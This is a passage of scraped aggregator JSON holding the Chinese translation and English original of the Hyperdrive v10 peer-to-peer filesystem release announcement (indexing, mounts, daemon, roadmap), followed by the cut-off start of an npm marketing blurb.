2\u4e2d)\u3001\u6302\u8f7d\u548c\u539f\u5b50\u91cd\u547d\u540d\u3002\u5b83\u5728\u5404\u65b9\u9762\u90fd\u8981\u597d\u4e00\u4e9b\u3002\n\u522b\u62c5\u5fc3\uff0c\u65b0\u7684Trie\u5c06\u5b8c\u5168\u843d\u540e\u4e8e\u6211\u4eec\u73b0\u5728\u53d1\u5e03\u7684Trie\u3002\n\u8be5\u5b88\u62a4\u8fdb\u7a0b\u63d0\u4f9b\u4e86\u8bb8\u591a\u65b0\u7684\u673a\u4f1a\uff0c\u56e0\u4e3a\u5b83\u65e2\u5c06\u6240\u6709\u9a71\u52a8\u5668\u5b58\u50a8\u5728\u78c1\u76d8\u4e0a\u7684\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u53c8\u5728\u4e00\u4e2a\u4f4d\u7f6e\u5904\u7406\u7f51\u7edc\u3002\u901a\u8fc7\u5168\u9762\u63a7\u5236\u5b58\u50a8/\u7f51\u7edc\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u60a8\u7684\u6574\u4e2a\u9a71\u52a8\u5668\u96c6\u5408\u4e2d\u6267\u884c\u4f18\u5316\u3002\n\u5728\u7f51\u7edc\u65b9\u9762\uff0c\u6211\u4eec\u91cd\u65b0\u7814\u7a76\u4e86\u5bf9\u5df2\u7531\u5176\u4ed6\u9a71\u52a8\u5668\u6ee1\u8db3\u7684\u6570\u636e\u5757\u8bf7\u6c42\u8fdb\u884c\u91cd\u590d\u6570\u636e\u6d88\u9664\u7684\u65b9\u6cd5\u3002\u8fd9\u91cc\u7684\u6700\u7ec8\u76ee\u6807\u662f\uff1a\u5373\u4f7f\u76f8\u540c\u7684\u6570\u636e\u5305\u542b\u5728\u4e0d\u540c\u7684\u9a71\u52a8\u5668\u4e2d\uff0c\u60a8\u4e5f\u4e0d\u5e94\u8be5\u4e0b\u8f7d\u76f8\u540c\u7684\u6570\u636e\u4e24\u6b21\u3002\n\u5728\u5b58\u50a8\u65b9\u9762\uff0c\u6211\u4eec\u6b63\u5728\u8003\u8651\u652f\u6301\u5185\u5bb9\u5bfb\u5740\u7684\u6570\u636e\u5757\u5b58\u50a8\uff0c\u8fd9\u610f\u5473\u7740\u5982\u679c\u60a8\u6709\u4e24\u4e2a\u7c7b\u4f3c\u7684\u9a71\u52a8\u5668\uff0c\u5219\u53ea\u6709\u4e00\u7ec4\u552f\u4e00\u7684\u6570\u636e\u5757\u5c06\u6301\u4e45\u4fdd\u5b58\u5728\u78c1\u76d8\u4e0a--\u516c\u5171\u6570\u636e\u5757\u5c06\u53ea\u5b58\u50a8\u4e00\u6b21\u3002\n\u867d\u7136\u5199\u5165\u5668\u53ef\u4ee5\u968f\u5fc3\u6240\u6b32\u5730\u66f4\u65b0\u5176\u9a71\u52a8\u5668(\u5373\u6dfb\u52a0\u65b0\u6587\u4ef6\u3001\u5220\u9664\u6587\u4ef6\u3001\u9644\u52a0\u5230\u6587\u4ef6\u7b49)\uff0c\u4f46\u67d0\u4e9b\u64cd\u4f5c\u6bd4\u5176\u4ed6\u64cd\u4f5c\u6548\u7387\u66f4\u9ad8\u3002\u4e0d\u5e78\u7684\u662f\uff0c\u7f16\u8f91\u73b0\u6709\u6587\u4ef6\u662f\u6548\u7387\u4f4e\u4e0b\u7684\u5de5\u4f5c\u4e4b\u4e00--\u5b83\u76ee\u524d\u4f1a\u5bfc\u81f4\u6587\u4ef6\u590d\u5236\u3002\u5982\u679c\u60a8\u5e0c\u671b\u5728FUSE\u4e0a\u8fd0\u884c\u6570\u636e\u5e93\u6216\u5c06\u5176\u8ffd\u52a0\u5230\u65e5\u5fd7\u6587\u4ef6\uff0c\u8fd9\u662f\u4e2a\u574f\u6d88\u606f\u3002\n\u66f4\u597d\u7684\u5783\u573e\u6536\u96c6\uff0c\u53ef\u4ee5\u8f7b\u677e\u5730\u4ece\u78c1\u76d8\u4e2d\u6e05\u9664\u65e7\u7248\u672c\u7684\u6587\u4ef6(\u5bf9\u4e8e\u7b80\u5355\u60c5\u51b5\u5f88\u597d\uff0c\u4f46\u5bf9\u6570\u636e\u5e93\u4ecd\u7136\u4e0d\u597d)\u3002\n\u9ad8\u6548\u7684\u6587\u4ef6\u66f4\u65b0\uff0c\u5199\u5165\u73b0\u6709\u6587\u4ef6\u4e0d\u4f1a\u5bfc\u81f4\u6570\u636e\u590d\u5236\u3002\n\u6211\u4eec\u6b63\u5728\u4e3a(2)\u63a2\u7d22\u57fa\u4e8einode\u7684\u5404\u79cd\u65b9\u6cd5\u3002\u5c31\u50cf\u4e00\u822c\u7684\u517c\u804c\u4f5c\u5bb6\u4e00\u6837\uff0c\u6d89\u53ca\u5230\u4e00\u4e2a\u68d8\u624b\u7684\u5e73\u8861\u884c\u4e3a\u3002\u652f\u6301\u8fd9\u4e9b\u66f4\u65b0\u7684\u7d22\u5f15\u5c06\u4e0d\u53ef\u907f\u514d\u5730\u589e\u52a0\u6ca1\u6709\u968f\u673a\u8bbf\u95ee\u4fee\u6539\u7684\u6587\u4ef6\u7684\u8bfb\u53d6\u5ef6\u8fdf\u3002\u5982\u679c\u4f60\u770b\u7684\u662f\u4e00\u90e8\u5927\u7535\u5f71\uff0c\u4ece\u5934\u5230\u5c3e\u90fd\u6ca1\u6709\u4fee\u6539\u8fc7\uff0c\u8fd9\u662f\u4e0d\u4f1a\u6709\u4ec0\u4e48\u5f71\u54cd\u7684\u3002\n\u5982\u4e0a\u6240\u8ff0\uff0c\u6587\u4ef6\u66f4\u65b0\u7684\u4ec5\u9644\u52a0\u6027\u8d28\u610f\u5473\u7740\u6211\u4eec\u5e76\u4e0d\u5b8c\u5168\u4fdd\u5b88\u5730\u4f7f\u7528\u60a8\u7684\u78c1\u76d8\u7a7a\u95f4\u3002HyperDrive\u76ee\u524d\u4e0d\u652f\u6301\u6e05\u9664\u65e7\u6587\u4ef6\u7248\u672c\uff0c\u4f46\u6211\u4eec\u5df2\u7ecf\u4f7f\u7528&#34\uff1b\u6807\u7b7e\u671d\u8fd9\u4e2a\u65b9\u5411\u8fc8\u51fa\u4e86\u4e00\u6b65\u3002&#34\uff1b\n\u4f7f\u7528\u6807\u7b7e\uff0c\u60a8\u53ef\u4ee5\u4e3a\u60a8\u5e0c\u671b\u4fdd\u7559\u7684\u9a71\u52a8\u5668\u7248\u672c\u6307\u5b9a\u540d\u79f0\u3002\u6211\u4eec\u5c06\u5f88\u5feb\u6dfb\u52a0\u5bf9clearUntagged\u65b9\u6cd5\u7684\u652f\u6301\uff0c\u8be5\u65b9\u6cd5\u5c06\u4ece\u78c1\u76d8\u4e2d\u5220\u9664\u672a\u6807\u8bb0\u7684\u6587\u4ef6\u7248\u672c\u3002\n\u6709\u4e86clearUntag\uff0c\u968f\u673a\u8bbf\u95ee\u5199\u5165\u5c31\u53d8\u5f97\u4e0d\u90a3\u4e48\u91cd\u8981\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u5e0c\u671b\u5b83\u80fd\u5728\u77ed\u671f\u5185\u5145\u5f53\u4e00\u4e2a\u5f88\u597d\u7684\u6743\u5b9c\u4e4b\u8ba1\u3002\n\u5750\u9a91\u76ee\u524d\u4e0d\u80fd\u76f8\u4e92\u91cd\u53e0\u3002\u7ec4\u6a21\u578b\u7ed5\u8fc7\u4e86\u8fd9\u4e00\u9650\u5236\uff0c\u542f\u7528\u4e86\u6709\u7528\u7684\u591a\u7528\u6237\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f46\u5728\u8bb8\u591a\u60c5\u51b5\u4e0b\uff0c\u60a8\u5e0c\u671b\u5728\u591a\u4e2a\u9a71\u52a8\u5668\u4e0a\u663e\u793a\u5408\u5e76\u89c6\u56fe\u3002\n\u4e3a\u4e86\u505a\u5230\u8fd9\u4e00\u70b9\uff0c\u6211\u4eec\u6b63\u5728\u8003\u8651\u6269\u5c55\u5750\u9a91\u7684\u65b9\u6cd5\u3002\u6211\u4eec\u4e0a\u9762\u63d0\u5230\u7684Trie\u63a7\u5236\u5668\u8bbe\u8ba1\u4f7f\u5f97\u8fd9\u91cc\u7684\u5b9e\u9a8c\u53d8\u5f97\u66f4\u5bb9\u6613\u3002\u4e00\u4e2a\u7b80\u5355\u7684\u8054\u5408\u6302\u8f7d\u529f\u80fd\uff0c\u6ca1\u6709\u4efb\u4f55\u56fa\u6267\u5df1\u89c1\u7684\u51b2\u7a81\u89e3\u51b3\u65b9\u6848(\u5373\u5e76\u6392\u663e\u793a\u51b2\u7a81\u6587\u4ef6)\uff0c\u662f\u5f88\u81ea\u7136\u7684\u4e0b\u4e00\u6b65\u3002\n\u5177\u6709\u53ef\u5b9a\u5236\u7684\u51b2\u7a81\u89e3\u51b3\u6302\u94a9\u7684\u901a\u7528\u591a\u7f16\u5199\u5668\u89e3\u51b3\u65b9\u6848\u4ecd\u5728\u6211\u4eec\u7684\u5f85\u529e\u4e8b\u9879\u5217\u8868\u4e0a\uff0c\u4f46\u8fd9\u4ecd\u662f\u4e00\u4e2a\u9065\u8fdc\u7684\u672a\u6765\u529f\u80fd\u3002\u6211\u4eec\u60f3\u5148\u770b\u770b\u5750\u9a91\u80fd\u8d70\u591a\u8fdc\u3002\n\u5728\u8fc7\u53bb\u7684\u4e00\u5e74\u91cc\uff0c\u4e3a\u8fd9\u4e2a\u7248\u672c\u505a\u51c6\u5907\u662f\u4e00\u4e2a\u5927\u56e2\u961f\u7684\u52aa\u529b\uff0c\u6211\u4eec\u975e\u5e38\u611f\u8c22Dat\u793e\u533a\u4e2d\u7684\u8bb8\u591a\u8d21\u732e\u8005\uff0c\u4ed6\u4eec\u5e2e\u52a9\u6d4b\u8bd5\u4e86\u5806\u6808\u7684alpha\u7248\u672c\uff0c\u4fee\u590d\u4e86bug\uff0c\u5e76\u5ba1\u67e5\u4e86\u6587\u6863\u3002\n\u7279\u522b\u8981\u611f\u8c22\u4e09\u661f\uff0c\u5b83\u6177\u6168\u7684\u4e09\u661fNEXT\u8d60\u6b3e\u4e3a\u8fd9\u9879\u5de5\u4f5c\u63d0\u4f9b\u4e86\u5927\u91cf\u8d44\u91d1\u3002\u975e\u5e38\u611f\u8c22\u91cc\u5361\u591a\u548c\u4e09\u661fNEXT\u56e2\u961f\u7684\u5176\u4ed6\u6210\u5458\uff01\n\u8981\u4e86\u89e3\u66f4\u591a\u5173\u4e8eHyperDrive\u5982\u4f55\u5728\u5e55\u540e\u5de5\u4f5c\u7684\u4fe1\u606f\uff0c\u60a8\u6700\u597d\u7684\u9009\u62e9\u662f\u67e5\u770bGitHub\u4e0a\u7684\u6e90\u4ee3\u7801\u3002\u6211\u4eec\u7684\u4ee3\u7801\u76ee\u524d\u5206\u6563\u5728\u591a\u4e2arepos\u4e2d\uff0c\u5927\u90e8\u5206\u5728Hypercore Protocol\u7ec4\u7ec7\u5185\u3002\u4ee5\u4e0b\u662f\u6211\u4eec\u5728\u8fd9\u7bc7\u6587\u7ae0\u4e2d\u8ba8\u8bba\u7684\u5185\u5bb9\u7684\u51e0\u4e2a\u76f4\u63a5\u94fe\u63a5\uff1a\n\u5982\u679c\u60a8\u5bf9HyperDrive\u7684\u8bbe\u8ba1\u6709\u7591\u95ee\uff0c\u6216\u8005\u60f3\u8981\u8c08\u8bba\u5806\u6808\uff0c\u8bf7\u7ed9\u6211\u4eec\u53d1\u4e0d\u548c\u8c10\u7684\u4fe1\u606f--\u8fd9\u5c31\u662f\u6211\u4eec\u5c06\u8fdb\u884c\u9762\u5411\u5f00\u53d1\u7684\u5bf9\u8bdd\u7684\u5730\u65b9\u3002\n\u5982\u679c\u60a8\u9047\u5230\u4efb\u4f55\u9519\u8bef\uff0c\u8bf7\u7ee7\u7eed\u5728\u6211\u4eec\u7684\u793e\u533a\u56de\u8d2d\u4e0a\u6253\u5f00\u95ee\u9898\u3002", "note_en": "For the past year, we&#39;ve been working hard on the v10 release of Hyperdrive. After a long period of beta testing, we&#39;re excited to announce that it&#39;s ready for general use!\n Hyperdrive is a peer-to-peer filesystem that&#39;s designed to help you share files quickly and safely, directly from your computer. Hyperdrive v9, along with many other modules prefixed by &#39;hyper&#39;, has served as the backbone for  Dat for many years -- you might already be familiar with Hyperdrive if you&#39;ve dug into Dat&#39;s internals.\n Leading up to this release, we&#39;ve done a bit of restructuring: Hyperdrive and its many hyper-siblings now live under a small, technically-focused brand/organization called the  Hypercore Protocol. Practically, this change means very little beyond branding, but we&#39;re hoping it will give the modules a chance to shine on their own. In light of that, here&#39;s a look inside Hyperdrive.\n In this post we&#39;ll step through some of the improvements we&#39;ve made in v10, explain how Hyperdrive fits into the broader Hypercore Protocol ecosystem, and show you how to get started using it. This release is only the beginning, and we describe our next steps in the  &#34;Looking Forward&#34; section.\n  Improved Indexing: We&#39;re using a new  HAMT-based indexing structure called a  Hypertrie, which gives huge perf/scaling boosts.\n  Hyperdrive Daemon: We&#39;ve created a cross-platform daemon that provides both FUSE and gRPC access to daemon-managed drives.\n Better Foundations: We&#39;ve recently introduced the  Hyperswarm DHT, and improvements to the  Hypercore protocol, which have helped make our whole stack snappier and more reliable.\n  Hyperdrive is a POSIX-compatible filesystem implementation, written in Node.js, that&#39;s designed to be the storage layer for fast, scalable, and secure peer-to-peer applications. For most developers, working with a Hyperdrive should feel just like using Node&#39;s standard  fs module, with only minor additions. Our main goal has always been to make it possible to share entire filesystems with others using a single 32-byte key (i.e.  hyper://ab13d...). We&#39;ll refer to Hyperdrive filesystems as &#34;drives&#34; from here on out.\n Drives are great for applications in which a single writer wants to distribute large, mutable collections of files to many readers. A file collection might be a video library, a personal blog, a scientific dataset, or what have you. Like BitTorrent, peers can download files from other peers without sacrificing trust (drive contents are signed by the original author).\n Unlike BitTorrent, files can be added or modified after a drive is created, and peers can &#34;watch&#34; a drive for updates, meaning update notifications are dispatched to readers in  realtime!\n Importantly, drives support efficient random-access file reads, meaning that you can seek through a video and it will download only the portions of the video you&#39;re viewing, on-demand. We call this property &#34;sparse downloading&#34;, and it&#39;s great for things like large websites (think all of Wikipedia mirrored to a drive) where readers only view single pages at a time.\n   Under the hood, Hyperdrive is built using two append-only log data structures called  Hypercores, one for an efficient metadata index and one for binary file content. You can learn more about Hypercore from the  Hypercore Protocol website. Hypercore gives us a fast and secure foundation for exchanging ordered blocks of data, but a good filesystem depends a good index.\n  To support performant filesystem operations, such as directory traversals, we&#39;ve layered a indexing data structure on top of Hypercore called a Hypertrie, which is an append-only implementation of a  hashed array-mapped trie. Painting a complete picture of Hypertrie is a blog post in itself, but the most important takeaway is that it lets us locate file/directory metadata, which is potentially scattered across many peers, using  O(log_4(n)) network requests, worst case. In practice, we use a specialized Hypercore extension to make this dramatically faster ( O(1) in most cases).\n  The Hypercore Protocol ecosystem has seen major improvements recently, and Hyperdrive directly benefits from all of them. Most significantly, Hyperdrive v10 leverages  Hypertrie for  better indexing, and  Hyperswarm for  better networking.\n  Hyperswarm is a Kademlia-backed DHT implementation that&#39;s designed specifically for the home. It uses a distributed approach to holepunching -- peers in the DHT can help bootstrap connections to other peers -- allowing us to traverse through the vast majority of home routers.\n Hyperswarm also comes full of heuristics designed to work around offline nodes and keep routing tables healthy. When combined with the holepunching, the heuristics make it dramatically faster to both discover and connect to peers.\n  Hyperdrive v9 used an indexing data structure that worked well for small drives, but quickly broke down as drives or directories grew large. In v10 we&#39;re using  Hypertrie. It scales nicely -- as a demo, we put a complete Wikipedia mirror (tens of millions of files, split across a few directories) into a drive, and reads remained very fast.\n We&#39;ll expand on Hypertrie in a follow-up post, but for now the main takeaway is that your directories can be as large as you (realistically) like, and file lookups will stay snappy!\n  For this release we&#39;ve focused on features that improve usability, simplify drive management, and reduce the friction of sharing. The two largest things we&#39;d like to introduce are  mounts, which let you create nested Hyperdrives, and the  Hyperdrive daemon, for serving as a one-stop shop for managing collections of drives.\n  Hypercore gives Hyperdrive many of its nice features, such as sparse downloading, for &#34;free&#34; -- the bulk of the work is handled at that layer. Hypercore, however, is fundamentally a single-writer data structure. A core&#39;s writer maintains a private key which is used to sign all appended data, making it possible for readers to exchange data amongst themselves without fear of tampering. Only letting one person (on one machine!) make changes to a drive is a big limitation, though. Not surprisingly, support for multiple writers has long been one of our most-requested features.\n In v10, we don&#39;t go all the way to a general multi-writer solution; solving multi-writer scalably, without incurring major performance penalties or confusing UX, remains a research question for us. That said, v10 introduces mounts, which are pretty much &#34;links&#34; to other Hyperdrives that look and act like normal directories.\n  Mounts open up lots of opportunities, both for more granular sharing and for fun multi-user applications. On the sharing side, you might create a  projects/ directory which contains mounts like  projects/my-module,  projects/my-website -- one drive for each thing you&#39;re working on. With mounts, you can share  my-website on its own, without giving away access to everything in  projects/. This pattern is especially handy in the daemon, which we&#39;ll talk about next.\n Things get more interesting when the drives you&#39;re mounting aren&#39;t your own. We&#39;ve had a lot of success with a &#34;groups&#34; pattern, wherein a &#34;group owner&#34; first creates a top-level group drive, then mounts &#34;user profiles&#34; within the group:\n /my-group // Owned by the group owner  (say User A )  /user-a // Owned by User A  /user-b // Owned by User B   ...\n Using this pattern, you can write simple &#34;groupware&#34; that aggregates content across users, using little more than a recursive  readdir on the group drive. For example, to find all blog posts in the group, you might search for all Markdown files in each user&#39;s  blog/ directory.\n  If you&#39;re using Hyperdrive directly, the  drive.mount(path, key, [opts]) method is what you&#39;re after. It works as you&#39;d expect from the args (mount  key at  path), and the options can include a static drive version.\n It&#39;s also easy to create mounts in the daemon through the CLI, which we&#39;ll describe next.\n  Hyperdrive is built with modular storage and networking in mind -- you can store drive contents however you like, and you can replicate them over any Node.js stream. This flexibility has benefits, but it makes it harder to get started. To that end, we&#39;ve created a cross-platform background service (a daemon) that handles storage/networking for you, while giving you a variety of ways to access daemon-managed drives.\n The daemon&#39;s a long-running service, so it can keep your drives online and available to readers. It&#39;s also great for DHT health: since the node on your computer is stable, the DHT&#39;s routing table contains fewer offline nodes. This translates to faster key lookups, meaning faster loading times.\n Most importantly, the daemon serves as a central point for exposing drives to external services -- currently we support a  gRPC API, with a corresponding  Node.js client library, and a FUSE interface.\n FUSE allows us to emulate a native filesystem directory from within our Node.js code. It lets us turn Hyperdrives into normal directories on your computer! This means that whenever the daemon is running, you&#39;ll be able to access drives directly from within the OSX Finder, say, as virtual directories inside  ~/Hyperdrive.\n With FUSE, drives are instantly accessible to other programs. You can watch movies using VLC, load PDFs using your favorite reader program, and use Unix utilities like  find and  ls to explore drives. We go into more depth in the &#34;Getting Started&#34; section below.\n  The  hyperdrive CLI tool contains a handful of commands both for interacting with FUSE, and for displaying information about drives. It also provides  import and  export commands, for those users who don&#39;t want to mess around with  ~/Hyperdrive.\n While the  ~/Hyperdrive directory was added to simplify end-user UX, the gRPC API exists for developers -- you can now program with Hyperdrive in any language, without needing to deal with tricky networking APIs. If you&#39;re using Node.js, the client library gives you a  RemoteHyperdrive interface that feels exactly like a normal drive. To get started, jump  here.\n We&#39;re hoping that the daemon provides a frictionless entry point both for end-users looking to share data, and for developers who want to build apps and services using Hyperdrive. If you have thoughts or feedback on the UX, don&#39;t hesitate to drop into our chat!\n  The best way to jump into the Hyperdrive stack is to install the daemon. This can be done through NPM:\n  Once the daemon&#39;s installed, you&#39;ll have access to the  hyperdrive CLI command. From here, you have a few options. It&#39;s best to consult the  daemon&#39;s README for a more detailed guide, but we&#39;ll highlight the key steps here.\n  Note: FUSE is currently only available on Linux and OSX. The CLI&#39;s  import and  export commands can be used to move data in/out of drives on Windows.\n Immediately after installation, you&#39;ll need to do a one-time setup step, which will request  sudo access -- don&#39;t worry, the daemon itself does not run as root. This is necessary in order to configure the bundled FUSE kernel modules:\n  After this, start the daemon normally and you&#39;ll notice that your  ~/Hyperdrive directory exist and contains a subdirectory called  Network. If you see  Network, you&#39;re good to go.\n As described in the walkthrough in the daemon README,  ~/Hyperdrive is your &#34;root drive,&#34; which you can think of as a replacement for your Home directory. You can create subdirectories like Documents, Videos, or Projects in it, as you like.\n ~/Hyperdrive/Network is a &#34;magic directory&#34; in that it does not actually exist inside of your root drive. It&#39;s there to make it easy to:\n  Details about  Network, along with explanations of all the CLI commands you can use to populate and explore your root drive, can be found in the  README.\n  If you have a daemon instance running, you can use the   hyperdrive-daemon-client module to create  RemoteHyperdrive objects. Under the hood, these will send commands over gRPC to daemon-managed drives.\n The  RemoteHyperdrive API mirrors Hyperdrive&#39;s. The following code snippet will create a client instance, use that client to create a new drive, then write a file to the drive:\n const  { HyperdriveClient  }  =  require ( &#39;hyperdrive-daemon-client&#39; )   // Auto-connects to the daemon  const client  =  new   ( )  await client . ready ( )   // Creates a new drive and writes a file  const drive  =  await client .drive . get ( )  await drive . writeFile ( &#39;foo.txt&#39; ,  &#39;bar&#39; )\n The daemon&#39;s README gives more examples. As of today, we only have a Node.js client, but the daemon&#39;s  gRPC schemas are available, and we&#39;d welcome any efforts to create clients in other languages.\n  The  Beaker Browser makes heavy use of Hyperdrive internally. Beaker 1.0 Beta, which is also being released  today, actually installs and manages the daemon for you in the background! Beaker comes packed with authoring tools for creating P2P websites and sharing them with others.\n The  Beaker developer portal contains thorough docs and tutorials (Tip: open that site in Beaker to make the tutorials interactive!), so you&#39;ll be off the ground immediately, building Hyperdrives containing fully-featured web applications (think personal wikis, photo albums, blog aggregators, and more).\n   You&#39;ll probably want to use the daemon/client most of the time, but in case you don&#39;t - perhaps in a one-off script or some kind of embedded scenario - you can use Hyperdrive as a module inside your program. The  README shows you how, and it&#39;s also where you&#39;ll find complete API docs.\n Here&#39;s a Gist containing a small, end-to-end example showing how to use Hyperswarm to discover and sync a Hyperdrive from another peer.\n In the future, we plan on making a few detailed tutorials about programmatic Hyperdrive usage. Remember, if you&#39;re looking for the simplest solution, check out the daemon and/or Beaker!\n  As you can see, a lot&#39;s been happening lately! But far more remains to be done. With these features released, here&#39;s a sketch of what we plan on tackling next.\n  The current implementation of Hypertrie&#39;s led to major gains. That said, it lacks a few features you might expect from a filesystem, most importantly atomic renames. Also, due to the way trie iteration works, both symlinks and mounts are slightly less efficient than they need to be.\n We&#39;ve been sitting on a new, heavily-fuzzed trie implementation for a while now, but we haven&#39;t had the cycles to integrate it yet. It supports symlinks (directly, as opposed to in the Hyperdrive layer), mounts, and atomic renames through a unified iterator abstraction that we&#39;re calling a &#34;trie controller&#34;. It&#39;s better all around.\n And don&#39;t worry, the new trie will be fully backwards-compat with the one we&#39;re releasing now.\n  The daemon affords us many new opportunities by virtue of its both storing all drives in one location on disk, and handling networking in one place. By having total control of storage/networking, we can perform optimizations across your entire drive collection.\n On the networking side, we&#39;re investigating methods for deduplicating block requests that have already been satisfied by other drives. The end-goal here is: &#34;you should never have to download the same data twice, even if its contained in different drives&#34;.\n On the storage side, we&#39;re considering supporting content-addressed block storage, meaning if you have two similar drives, only the set of unique blocks will be persisted on disk -- common blocks will only be stored once.\n  While a writer can update their drives however they like (i.e. adding new files, deleting files, appending to files, etc.), certain operations are more efficient than others. Unfortunately, editing existing files is one of the inefficient ones -- it currently results in file duplication. This is bad news if you want to run a database on FUSE or append to log files.\n  Better garbage collection, where old versions of files can be cleared from disk easily (fine for simple cases, but still bad for databases).\n Efficient file updates, where writing to an existing file does not lead to data copying.\n We&#39;re exploring various approaches based on  inodes for (2). As with general multiwriter, there&#39;s a tricky balancing act involved. An index that supports these updates will unavoidably increase read latencies for files that don&#39;t have random-access modifications. This won&#39;t cut it if you&#39;re watching a large movie, never modified after it was first written, from start to end.\n   As described above, the append-only nature of file updates means that we&#39;re not exactly being conservative with your disk space. Hyperdrive does not currently support clearing old file versions, but we&#39;ve taken a step in that direction with &#34;tags.&#34;\n Using tags, you can assign names to drive versions you&#39;d like to keep around. We&#39;ll shortly be adding support for a  clearUntagged method that will remove untagged file versions from disk.\n With  clearUntagged, random-access writes become less essential, so we&#39;re hoping it will serve as a nice near-term stopgap.\n  Mounts currently cannot overlap with one another. The group model works around this limitation, enabling useful multi-user applications, but there are many cases where you&#39;d like to display a &#34;merged view&#34; over many drives.\n To accomplish this, we&#39;re thinking about ways to extend mounts. The &#34;trie controller&#34; design we alluded to above makes experimentation easier here. A simple union mounts feature, without any opinionated conflict resolution (i.e. displaying conflicting files side-by-side), is a natural next step.\n A general multiwriter solution, with customizable hooks for conflict resolution, remains on our to-do list, but that&#39;s still a far-future feature. We want to see how far we can go with mounts first.\n  Gearing up for this release has been a big group effort over the past year, and we owe a lot to the many contributors in the Dat community who have helped test alpha versions of the stack, fix bugs, and review docs.\n A very special thanks goes to Samsung, whose generous  Samsung Next grant funded a massive chunk of this work. Huge thanks to Ricardo and the rest of the Samsung Next team!\n  To learn more about how Hyperdrive works under the hood, your best bet is to check out the source code on GitHub. Our code&#39;s currently split across a number of repos, most within the  Hypercore Protocol organization. Here are a few direct links to the stuff we&#39;ve discussed in this post:\n   If you have questions about Hyperdrive&#39;s design, or want to talk about the stack, message us on  Discord -- that&#39;s where we&#39;ll be having development-oriented conversations.\n If you run into any bugs, go ahead and open issues on our  Community repo.", "posttime": "2020-05-15 00:37:05", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u63a8\u51fa,peer,\u9a71\u52a8\u5668", "title": "\u5ba3\u5e03\u63a8\u51faHyperDrive V10-\u4e00\u79cd\u70b9\u5bf9\u70b9\u6587\u4ef6\u7cfb\u7edf", "title_en": "Announcing Hyperdrive v10 \u2013 a peer-to-peer filesystem", "transed": 1, "url": "https://blog.hypercore-protocol.org/posts/announcing-hyperdrive-10/", "via": "", "real_tags": ["\u63a8\u51fa", "peer", "\u9a71\u52a8\u5668"]}, {"category": "", "categoryclass": "", "imagename": "080d5a8a5213e5420d7f821f914d60c8.png", "infoid": 1002110, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u6211\u4eec\u662fNPM\uff0cInc.\uff0cNode Package Manager\u3001NPM\u6ce8\u518c\u8868\u548cNPM CLI\u80cc\u540e\u7684\u516c\u53f8\u3002\u6211\u4eec\u514d\u8d39\u5411\u793e\u533a\u63d0\u4f9b\u8fd9\u4e9b\u5de5\u5177\uff0c\u4f46\u6211\u4eec\u7684\u65e5\u5e38\u5de5\u4f5c\u662f\u4e3a\u60a8\u8fd9\u6837\u7684\u5f00\u53d1\u4eba\u5458\u6784\u5efa\u548c\u9500\u552e\u6709\u7528\u7684\u5de5\u5177\u3002\n\u73b0\u5728\u5c31\u5f00\u59cb\u514d\u8d39\uff0c\u6216\u8005\u5347\u7ea7\u5230NPM Pro\uff0c\u4eab\u53d7\u9ad8\u7ea7JavaScript\u5f00\u53d1\u4f53\u9a8c\uff0c\u5305\u62ec\u79c1\u6709\u8f6f\u4ef6\u5305\u7b49\u529f\u80fd\u3002\nNPM\u53d7\u5230\u5168\u74031100\u591a\u4e07\u5f00\u53d1\u4eba\u5458\u7684\u4f9d\u8d56\uff0c\u81f4\u529b\u4e8e\u4f7fJavaScript\u5f00\u53d1\u53d8\u5f97\u4f18\u96c5\u3001\u9ad8\u6548\u548c\u5b89\u5168\u3002\u514d\u8d39\u7684NPM\u6ce8\u518c\u4e2d\u5fc3\u5df2\u7ecf\u6210\u4e3aJavaScript\u4ee3\u7801\u5171\u4eab\u7684\u4e2d\u5fc3\uff0c\u62e5\u6709100\u591a\u4e07\u4e2a\u5305\uff0c\u662f\u4e16\u754c\u4e0a\u6700\u5927\u7684\u8f6f\u4ef6\u6ce8\u518c\u4e2d\u5fc3\u3002\u6211\u4eec\u7684\u5176\u4ed6\u5de5\u5177\u548c\u670d\u52a1\u4f7f\u6ce8\u518c\u8868\u548c\u60a8\u56f4\u7ed5\u5b83\u6240\u505a\u7684\u5de5\u4f5c\u66f4\u4e0a\u4e00\u5c42\u697c\u3002\n\u6210\u4e3a\u5f00\u6e90JavaScript\u793e\u533a\u7684\u8d21\u732e\u6210\u5458\u3002\u521b\u5efa\u516c\u5171\u5305\u3001\u53d1\u5e03\u66f4\u65b0\u3001\u5ba1\u6838\u4f9d\u8d56\u9879\u7b49\u3002\n\u9762\u5411\u60f3\u8981\u66f4\u591a\u529f\u80fd\u7684\u4e0b\u4e00\u7ea7JavaScript\u5f00\u53d1\u4eba\u5458\u3002\u4e13\u4e1a\u4eba\u5458\u548c\u56e2\u961f\u589e\u52a0\u4e86\u4e3a\u60a8\u3001\u60a8\u7684\u56e2\u961f\u6216\u5ba2\u6237\u6784\u5efa\u79c1\u4eba\u8f6f\u4ef6\u5305\u7684\u80fd\u529b\u3002\n\u5bf9\u4e8e\u975e\u5e38\u5927\u7684\u56e2\u961f\u548c\u4e1a\u52a1\u5173\u952e\u578b\u9879\u76ee\uff0cNPM 